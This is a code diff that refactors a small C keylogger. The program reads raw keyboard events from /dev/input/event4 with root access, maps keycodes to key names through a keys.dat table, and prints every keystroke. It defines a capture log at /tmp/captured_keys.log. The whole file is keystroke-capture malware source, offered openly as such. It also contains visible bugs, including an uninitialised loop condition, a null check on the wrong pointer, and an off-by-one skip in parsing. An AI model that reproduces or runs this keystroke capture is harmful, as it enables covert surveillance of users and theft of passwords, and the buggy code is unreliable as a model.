@@ -9,58 +9,68 @@
 #include <string.h>
 #define ERROR_PATH "/tmp/errors_keylogger.log"
 #define CAPTURE_PATH "/tmp/captured_keys.log"
+#define LONGEST_KEY 22
 
+typedef struct keys_s
+{
+	char key[LONGEST_KEY + 1];
+	int size;
+	FILE *file;
+} keys_t;
+
+int create_socket(const char *event_path, FILE **file, int *fd);
 int create_logs_files(void);
 int read_from_event4(struct input_event *ev, int fd);
-void write_error_log(const char *error); // TO WRITE
-int	translate_keycode(unsigned short code, char key[], int size);
+int	translate_keycode(unsigned short code, keys_t *keys);
 
 int main(void)
 {
 	struct input_event ev;
-	char key[23];
-	int size_key;
+	keys_t keys;
 	int fd;
 
-	size_key = 23;
-	if (!create_logs_files())
-	{
-		printf("Unable to create log files\n");
+	keys.size = LONGEST_KEY + 1;
+	if (!create_socket("/dev/input/event4", &keys.file, &fd))
 		return (1);
-	}
-	fd = open("/dev/input/event4", O_RDONLY);
-	if (fd < 0)
-	{
-		printf("Unable to read event4, is it in sudo ?\n");
-		return (0);
-	}
-	while (1) //
+	while (ev.code != 1)
 	{
 		memset(&ev, 0, sizeof(ev));
 		if (!read_from_event4(&ev, fd))
 		{
-			printf("cc\n");
+			fprintf(stderr, "Unable to read in the fd of event4\n");
 			break;
 		}
 		if (ev.type == EV_KEY && ev.value == 1)
 		{
 			printf("keycode\t%d\n\n", ev.code);
-			if (!translate_keycode(ev.code, key, size_key))
-				strncpy(key, "UNKNOW", size_key);
-			printf("key translated: %s\n", key);
+			if (!translate_keycode(ev.code, &keys))
+				strncpy(keys.key, "UNKNOW", keys.size);
+			printf("key translated: %s\n", keys.key);
 		}
 		fflush(stdout);
 	}
+	fclose(keys.file);
 }
 
-int read_from_event4(struct input_event *ev, int fd)
+int create_socket(const char *event_path, FILE **file, int *fd)
 {
-	ssize_t n;
-
-	n = read(fd, ev, sizeof(*ev));
-	//printf("n: %ld\n", n);
-	if (n < 0)
+	*fd = open(event_path, O_RDONLY);
+	if (*fd < 0)
+	{
+		fprintf(stderr, "Unable to read event4, is it in sudo ?\n");
 		return (0);
+	}
+	if (!create_logs_files())
+	{
+		fprintf(stderr, "Unable to create log files\n");
+		return (0);
+	}
+	*file = fopen("./keys.dat", "r");
+	if (!file)
+	{
+		fprintf(stderr, "Unable to read keys.dat file");
+		return (0);
+	}
 	return (1);
 }
 
@@ -86,9 +96,18 @@ int create_logs_files(void)
 	return (1);
 }
 
-int	translate_keycode(unsigned short code, char key[], int size)
+int read_from_event4(struct input_event *ev, int fd)
 {
-	FILE *file;
+	ssize_t n;
+
+	n = read(fd, ev, sizeof(*ev));
+	if (n < 0)
+		return (0);
+	return (1);
+}
+
+int	translate_keycode(unsigned short code, keys_t *keys)
+{
 	char *line;
 	size_t size_line;
 	unsigned short lcode;
@@ -98,36 +117,26 @@ int	translate_keycode(unsigned short code, char key[], int size)
 	size_line = 0;
 	line = NULL;
 	ki = 0;
-	key[0] = '\0';
-	file = fopen("./keys.dat", "r");
-	if (!file)
-	{
-		//write_error_logs("Unable to read keys.dat file");
-		return (0);
-	}
-	while (getline(&line, &size_line, file) > EOF && key[0] == '\0')
+	keys->key[ki] = '\0';
+	rewind(keys->file);
+	while (getline(&line, &size_line, keys->file) > EOF \
+			&& keys->key[0] == '\0')
 	{
 		i = 0;
 		lcode = 0;
-		printf("cc\n");
-		// take the code
-		while (line[i] != ' ')
+		while (line[i] != ' ' && line[i] != '\t')
 			lcode = lcode * 10 + (line[i++] - '0');
 		if (lcode != code)
-		{
-			free(line);
 			continue;
-		}
-		// goto key's name
-		while (line[i] != '#')
-			++i;
+		while (line[i++] != '#')
+			;
 		++i;
-		while (line[i] != '\n' && ki < size - 1)
-			key[ki++] = line[i++];
-		key[ki] = '\0';
+		while (line[i] != '\n' && ki < keys->size - 1)
+			keys->key[ki++] = line[i++];
+		keys->key[ki] = '\0';
 	}
 	free(line);
-	if (!key)
+	if (!keys->key[0])
 		return (0);
 	return (1);
 }
